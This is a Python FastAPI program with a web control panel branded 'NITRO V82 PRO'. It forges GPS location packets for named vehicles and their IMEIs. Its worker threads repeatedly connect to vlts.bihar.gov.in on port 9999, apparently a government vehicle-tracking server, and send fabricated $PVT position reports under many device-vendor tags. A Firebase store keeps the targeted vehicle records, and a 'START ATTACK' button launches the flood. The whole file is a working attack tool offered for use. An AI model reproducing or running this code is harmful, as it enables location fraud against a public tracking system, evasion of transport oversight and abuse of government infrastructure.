import socket, threading, time, requests, json
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

# --- 🚀 REST API LOGIC (LOCKED - NO CHANGES) ---
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"

firing = False
total_sent = 0
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

@app.get("/fetch_data")
def fetch_data(vno: str):
    v_up = vno.upper().strip()
    try:
        response = requests.get(f"{DB_URL}/Data_Records/{v_up}.json")
        data = response.json()
        if data:
            return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
    except: pass
    return {"found": False, "err": "NOT_IN_DB"}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent
    if not firing:
        v_up = v.upper().strip()
        firing, total_sent = True, 0
        payload = {"IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active"}
        try: requests.put(f"{DB_URL}/Data_Records/{v_up}.json", json=payload)
        except: pass
        for tag in TAGS:
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
    return {"ok": True}

def handshake_worker(tag, imei, vno, lat, lon):
    global firing, total_sent
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("vlts.bihar.gov.in", 9999))
            now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
            s.sendall(bytes(pkt, 'ascii'))
            total_sent += 1
            s.close()
            time.sleep(0.1)
        except: time.sleep(1)

@app.get("/status")
def status(): return {"c": total_sent, "f": firing}

@app.get("/stop")
def stop(): global firing; firing = False; return {"ok": True}

# --- 🎨 FINAL UI (RESET BUTTON INCLUDED) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO | MASTER</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; height:100vh; overflow:hidden; }
        .box { width:420px; border:2px solid #0f0; padding:20px; background:rgba(0,10,0,0.9); border-radius:15px; box-shadow: 0 0 20px #0f0; z-index:10; margin-top:20px; }
        input { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:8px; outline:none; text-transform:uppercase; font-size:14px; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:14px; }
        .btn-loc { background:#003300; border-color:#0f0; font-size:11px; padding:8px; }
        .btn-reset { color:#ffff00; border-color:#ffff00; font-size:11px; padding:8px; margin-top:10px; }
        #map { width:100%; height:230px; margin-top:15px; border:1px solid #0f0; border-radius:10px; filter: invert(100%) hue-rotate(180deg) brightness(95%) contrast(90%); }
        .progress-container { width:100%; height:10px; background:#111; margin-top:15px; border-radius:5px; overflow:hidden; display:none; border:1px solid #0f0; }
        #progress-bar { width:0%; height:100%; background:linear-gradient(90deg, #0f0, #00ff00); box-shadow: 0 0 10px #0f0; transition: width 0.3s; }
        .stats { display:flex; justify-content:space-between; margin-top:12px; font-weight:bold; font-size:15px; border-top: 1px solid #222; padding-top:10px; }
    </style></head><body>
    <div class="box">
        <h2 style="text-align:center;margin:0;letter-spacing:4px;color:#fff;">NITRO V82 PRO</h2>
        <input type="text" id="v" onblur="fetchData()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI">
        <div style="display:flex;gap:5px;">
            <input type="text" id="lt" placeholder="LAT">
            <input type="text" id="ln" placeholder="LON">
        </div>
        <button class="btn-loc" onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
        <button onclick="st()" id="startBtn" style="background:#0f0; color:#000;">START ATTACK</button>
        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
        <button class="btn-reset" onclick="location.reload()">[ RESET SYSTEM ]</button>
        
        <div class="progress-container" id="p-cont"><div id="progress-bar"></div></div>
        <div id="map"></div>
        
        <div class="stats">
            <span>SENT: <b id="c" style="color:#fff">0</b></span>
            <span id="st" style="color:lime">IDLE</span>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([20.5937, 78.9629], 5);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        let marker = L.marker([20.5937, 78.9629]).addTo(map);

        let mon;
        function updateMap(lt, ln) {
            let lat = parseFloat(lt); let lon = parseFloat(ln);
            if(!isNaN(lat) && !isNaN(lon)) {
                map.setView([lat, lon], 14);
                marker.setLatLng([lat, lon]);
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    document.getElementById('lt').value = pos.coords.latitude.toFixed(6);
                    document.getElementById('ln').value = pos.coords.longitude.toFixed(6);
                    updateMap(pos.coords.latitude, pos.coords.longitude);
                });
            }
        }

        function fetchData() {
            let v = document.getElementById('v').value.trim();
            if(v.length > 4) {
                fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                    if(d.found) {
                        document.getElementById('i').value=d.imei;
                        document.getElementById('lt').value=d.lat;
                        document.getElementById('ln').value=d.lon;
                        updateMap(d.lat, d.lon);
                    }
                });
            }
        }

        function st() {
            let v = document.getElementById('v').value;
            let i = document.getElementById('i').value;
            let lt = document.getElementById('lt').value;
            let ln = document.getElementById('ln').value;
            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
            document.getElementById('st').innerText="FIRING";
            document.getElementById('st').style.color="red";
            document.getElementById('p-cont').style.display="block";
            if(!mon) mon = setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=>{
                    document.getElementById('c').innerText = d.c;
                    let prog = (d.c % 100);
                    document.getElementById('progress-bar').style.width = prog + "%";
                });
            }, 1000);
        }

        function sp() {
            fetch('/stop');
            clearInterval(mon); mon=null;
            document.getElementById('st').innerText="IDLE";
            document.getElementById('st').style.color="lime";
            document.getElementById('p-cont').style.display="none";
        }
    </script></body></html>
    """
